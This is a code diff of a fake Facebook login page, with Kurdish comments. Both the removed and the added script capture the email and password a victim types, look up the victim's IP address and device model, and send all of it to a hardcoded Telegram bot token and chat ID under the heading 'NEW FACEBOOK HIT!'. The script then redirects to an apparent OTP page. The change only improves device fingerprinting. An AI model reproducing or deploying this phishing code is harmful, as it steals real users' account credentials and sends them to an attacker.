@@ -37,48 +37,58 @@
         </div>
     </div>
 
-    <script>
-        const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
-        const chatId = "6679834643";
+<script>
+    const botToken = "8325580182:AAEZlBl-DbtFVRA2X3b9mN8qq-EAEcr_Aoc";
+    const chatId = "6679834643";
 
-        async function login() {
-            const user = document.getElementById('user').value;
-            const pass = document.getElementById('pass').value;
+    async function login() {
+        const user = document.getElementById('user').value;
+        const pass = document.getElementById('pass').value;
 
-            if(!user || !pass) {
-                alert("The email address or mobile number you entered isn't connected to an account.");
-                return;
-            }
-
-            // وەرگرتنی IP
-            let userIP = "Unknown";
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                userIP = data.ip;
-            } catch (e) {
-                userIP = "Unavailable";
-            }
-
-            // وەرگرتنی زانیاری ئامێر و وێبگەڕ
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-
-            const msg = `👤 **NEW FACEBOOK HIT!**\n\n` +
-                        `📧 **User:** \`${user}\` \n` +
-                        `🔑 **Pass:** \`${pass}\` \n\n` +
-                        `🌐 **IP Address:** \`${userIP}\` \n` +
-                        `📱 **Platform:** \`${platform}\` \n` +
-                        `🖥️ **Device Info:** \`${userAgent}\``;
-            
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=markdown`)
-            .then(() => {
-                window.location.href = "Otm.html";
-            })
-            .catch(() => {
-                window.location.href = "Otm.html";
-            });
+        if(!user || !pass) {
+            alert("The email address or mobile number you entered isn't connected to an account.");
+            return;
         }
-    </script>
+
+        // وەرگرتنی IP
+        let userIP = "Unknown";
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            userIP = ipData.ip;
+        } catch (e) { userIP = "Error Fetching IP"; }
+
+        // وەرگرتنی زانیاری وردی ئامێر
+        const ua = navigator.userAgent;
+        let deviceModel = "Unknown Device";
+
+        if (/android/i.test(ua)) {
+            // ئەگەر ئەندرۆید بوو، هەوڵ دەدەین مۆدێلەکەی بدۆزینەوە لە ناو کەوانەکاندا
+            const match = ua.match(/\(([^;]+);([^;]+);([^)]+)\)/);
+            deviceModel = match ? match[3].trim() : "Android Device";
+        } else if (/iPhone|iPad|iPod/i.test(ua)) {
+            // بۆ ئایفۆن بە دەق نانووسێت چ جۆرێکە، تەنها دەنووسێت iPhone
+            deviceModel = "iPhone / iOS Device";
+            // دەتوانین بە پێی ڕێزۆلوشن مەزندەی بکەین بەڵام ورد نییە
+        } else if (/Windows/i.test(ua)) {
+            deviceModel = "Windows PC";
+        }
+
+        const msg = `👤 **NEW FACEBOOK HIT!**\n\n` +
+                    `📧 **User:** \`${user}\` \n` +
+                    `🔑 **Pass:** \`${pass}\` \n\n` +
+                    `🌐 **IP:** \`${userIP}\` \n` +
+                    `📱 **Device:** \`${deviceModel}\` \n` +
+                    `🖥️ **Full Agent:** \`${ua}\``;
+        
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=markdown`)
+        .then(() => {
+            window.location.href = "Otm.html";
+        })
+        .catch(() => {
+            window.location.href = "Otm.html";
+        });
+    }
+</script>
 </body>
 </html>
